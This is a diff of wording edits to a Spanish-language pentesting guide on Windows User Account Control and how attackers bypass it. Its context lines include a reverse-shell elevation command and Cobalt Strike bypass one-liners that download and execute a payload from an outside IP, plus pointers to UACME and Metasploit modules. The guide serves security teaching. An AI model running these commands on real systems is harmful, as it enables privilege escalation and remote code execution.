@@ -4,7 +4,7 @@
 
 ## UAC
 
-[Control de Cuentas de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una función que habilita un **mensaje de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integridad`, y un programa con un **alto nivel** puede realizar tareas que **podrían comprometer potencialmente el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta no administrativa** a menos que un administrador autorice explícitamente a estas aplicaciones/tareas para tener acceso a nivel de administrador al sistema para ejecutarse. Es una función de conveniencia que protege a los administradores de cambios no intencionados, pero no se considera un límite de seguridad.
+[Control de Cuentas de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que permite un **mensaje de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integridad`, y un programa con un **alto nivel** puede realizar tareas que **podrían comprometer potencialmente el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta no administrativa** a menos que un administrador autorice explícitamente a estas aplicaciones/tareas a tener acceso de nivel administrativo al sistema para ejecutarse. Es una característica de conveniencia que protege a los administradores de cambios no intencionados, pero no se considera un límite de seguridad.
 
 Para más información sobre los niveles de integridad:
 
@@ -33,7 +33,7 @@ Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protec
 
 Algunos programas son **autoelevados automáticamente** si el **usuario pertenece** al **grupo de administradores**. Estos binarios tienen dentro de sus _**Manifiestos**_ la opción _**autoElevate**_ con valor _**True**_. El binario también debe estar **firmado por Microsoft**.
 
-Luego, para **eludir** el **UAC** (elevar de **nivel** de integridad **medio** **a alto**) algunos atacantes utilizan este tipo de binarios para **ejecutar código arbitrario** porque se ejecutará desde un **proceso de alta integridad**.
+Luego, para **eludir** el **UAC** (elevar de **nivel** de integridad **medio** a **alto**) algunos atacantes utilizan este tipo de binarios para **ejecutar código arbitrario** porque se ejecutará desde un **proceso de alta integridad**.
 
 Puedes **verificar** el _**Manifiesto**_ de un binario usando la herramienta _**sigcheck.exe**_ de Sysinternals. Y puedes **ver** el **nivel de integridad** de los procesos usando _Process Explorer_ o _Process Monitor_ (de Sysinternals).
 
@@ -56,10 +56,10 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 - Si **`0`** entonces, UAC no pedirá (como **deshabilitado**)
-- Si **`1`** se le **pide al administrador el nombre de usuario y la contraseña** para ejecutar el binario con altos derechos (en Escritorio Seguro)
-- Si **`2`** (**Siempre notifícame**) UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con altos privilegios (en Escritorio Seguro)
-- Si **`3`** como `1` pero no necesariamente en Escritorio Seguro
-- Si **`4`** como `2` pero no necesariamente en Escritorio Seguro
+- Si **`1`** se le **pide al administrador el nombre de usuario y la contraseña** para ejecutar el binario con altos derechos (en Secure Desktop)
+- Si **`2`** (**Siempre notifícame**) UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con altos privilegios (en Secure Desktop)
+- Si **`3`** como `1` pero no es necesario en Secure Desktop
+- Si **`4`** como `2` pero no es necesario en Secure Desktop
 - si **`5`**(**predeterminado**) pedirá al administrador que confirme para ejecutar binarios no de Windows con altos privilegios
 
 Luego, debes revisar el valor de **`LocalAccountTokenFilterPolicy`**\
@@ -82,18 +82,18 @@ También puedes verificar los grupos de tu usuario y obtener el nivel de integri
 net user %username%
 whoami /groups | findstr Level
 ```
-## Bypass de UAC
+## UAC bypass
 
 > [!NOTE]
-> Tenga en cuenta que si tiene acceso gráfico a la víctima, el bypass de UAC es directo, ya que simplemente puede hacer clic en "Sí" cuando aparece el aviso de UAC.
+> Tenga en cuenta que si tiene acceso gráfico a la víctima, el bypass de UAC es sencillo, ya que simplemente puede hacer clic en "Sí" cuando aparece el aviso de UAC.
 
 El bypass de UAC es necesario en la siguiente situación: **el UAC está activado, su proceso se está ejecutando en un contexto de integridad media y su usuario pertenece al grupo de administradores**.
 
 Es importante mencionar que es **mucho más difícil eludir el UAC si está en el nivel de seguridad más alto (Siempre) que si está en cualquiera de los otros niveles (Predeterminado).**
 
-### UAC desactivado
+### UAC deshabilitado
 
-Si el UAC ya está desactivado (`ConsentPromptBehaviorAdmin` es **`0`**) puede **ejecutar un shell inverso con privilegios de administrador** (nivel de integridad alto) utilizando algo como:
+Si UAC ya está deshabilitado (`ConsentPromptBehaviorAdmin` es **`0`**) puede **ejecutar un shell inverso con privilegios de administrador** (nivel de integridad alto) utilizando algo como:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -131,16 +131,16 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** y **Metasploit** también tienen varios módulos para **eludir** el **UAC**.
+**Empire** y **Metasploit** también tienen varios módulos para **bypassear** el **UAC**.
 
 ### KRBUACBypass
 
 Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
-### Explotaciones de elusión de UAC
+### Explotaciones de bypass de UAC
 
-[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varias explotaciones de elusión de UAC. Ten en cuenta que necesitarás **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitarás saber **cuál necesitas.**\
-Debes **tener cuidado** porque algunas elusiones **solicitarán algunos otros programas** que **alertarán** al **usuario** que algo está sucediendo.
+[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varias explotaciones de bypass de UAC. Ten en cuenta que necesitarás **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitarás saber **cuál necesitas.**\
+Debes **tener cuidado** porque algunos bypasses **solicitarán algunos otros programas** que **alertarán** al **usuario** que algo está sucediendo.
 
 UACME tiene la **versión de compilación desde la cual cada técnica comenzó a funcionar**. Puedes buscar una técnica que afecte tus versiones:
 ```
